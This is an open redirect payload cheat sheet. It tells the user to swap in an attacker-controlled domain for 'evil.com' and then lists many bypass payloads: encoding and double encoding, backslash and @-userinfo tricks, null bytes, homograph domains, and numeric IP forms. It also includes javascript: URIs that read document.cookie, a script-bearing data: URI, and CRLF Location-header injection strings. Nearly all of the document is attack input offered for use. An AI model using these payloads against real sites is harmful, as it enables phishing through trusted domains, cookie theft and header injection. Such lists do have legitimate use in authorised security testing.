## ============================================================
## Open Redirect Payloads
## ============================================================
## Replace "evil.com" with your attacker-controlled domain
## Test in parameters: ?url=, ?redirect=, ?next=, ?return=, ?rurl=,
##   ?dest=, ?destination=, ?redir=, ?redirect_uri=, ?redirect_url=,
##   ?return_to=, ?returnTo=, ?go=, ?goto=, ?exit=, ?out=, ?view=,
##   ?login=, ?logout=, ?to=, ?image_url=, ?continue=, ?window=,
##   ?callback=, ?ref=, ?data=, ?reference=, ?site=, ?html=, ?val=,
##   ?validate=, ?domain=, ?checkout_url=, ?return_path=, ?forward=

## ---- BASIC PAYLOADS ----
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com
/\evil.com
\/\/evil.com

## ---- PROTOCOL-RELATIVE ----
//evil.com
//evil.com/
//evil.com/%2f..
//evil.com@legitimate.com
//evil.com%E3%80%82legitimate.com

## ---- URL ENCODING ----
%2f%2fevil.com
%2f%2f%2fevil.com
%68%74%74%70%3a%2f%2fevil.com
https%3a%2f%2fevil.com
%00//evil.com

## ---- DOUBLE URL ENCODING ----
%252f%252fevil.com
%255c%255cevil.com

## ---- BACKSLASH ----
\evil.com
\\evil.com
/\/evil.com
\/evil.com

## ---- @ SYMBOL TRICKS ----
## Browser treats text before @ as userinfo
https://legitimate.com@evil.com
http://legitimate.com@evil.com
//legitimate.com@evil.com
https://legitimate.com%40evil.com
https://legitimate.com:password@evil.com

## ---- NULL BYTE / WHITESPACE ----
//evil.com%00.legitimate.com
//evil.com%0d%0a.legitimate.com
//evil%00.com
https://evil.com%23.legitimate.com
https://evil.com%09
https://evil.com%0a
https://evil.com%0d

## ---- FRAGMENT / PARAMETER ----
https://legitimate.com#@evil.com
https://legitimate.com?@evil.com
https://legitimate.com?next=https://evil.com
/redirect?url=https://evil.com#legitimate.com

## ---- DOMAIN CONFUSION ----
https://evil.com/.legitimate.com
https://evil.com\@legitimate.com
https://legitimate.com.evil.com
evil.com%252elegitimate.com
evil.com%23legitimate.com

## ---- JAVASCRIPT PROTOCOL ----
javascript:alert(document.domain)//
javascript://legitimate.com/%0aalert(1)
javascript:alert(document.cookie)
java%0d%0ascript%0d%0a:alert(0)
j%0aavascript:alert(0)

## ---- DATA URI ----
data:text/html,<script>window.location='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+

## ---- IP-BASED ----
## Decimal IP
http://2130706433 (= 127.0.0.1)
http://3232235521 (= 192.168.0.1)

## Hex IP
http://0x7f000001 (= 127.0.0.1)

## Octal IP
http://0177.0.0.01 (= 127.0.0.1)

## ---- CASE MANIPULATION ----
HTTPS://EVIL.COM
Https://Evil.Com
hTtPs://eViL.cOm

## ---- HOMOGRAPH / UNICODE ----
## Cyrillic/lookalike characters
https://еvіl.com (Cyrillic е and і)
https://evil。com (fullwidth dot)
https://evil%E3%80%82com (ideographic period)

## ---- HEADER INJECTION FOR REDIRECT ----
## If input reflects into Location header
%0d%0aLocation:%20https://evil.com
%E5%98%8A%E5%98%8DLocation:%20https://evil.com

## ---- COMMON BYPASS PATTERNS ----
## When app checks for "legitimate.com" substring
https://evil.com/legitimate.com
https://evil.com?legitimate.com
https://evil.com#legitimate.com
https://evil.com\.legitimate.com
https://legitimate.com.evil.com/
https://evil.com/%0d/legitimate.com

## When app checks for leading /
/https://evil.com
/http://evil.com
/%2f%2fevil.com

## When app checks path starts with /
/../evil.com
/..;/evil.com
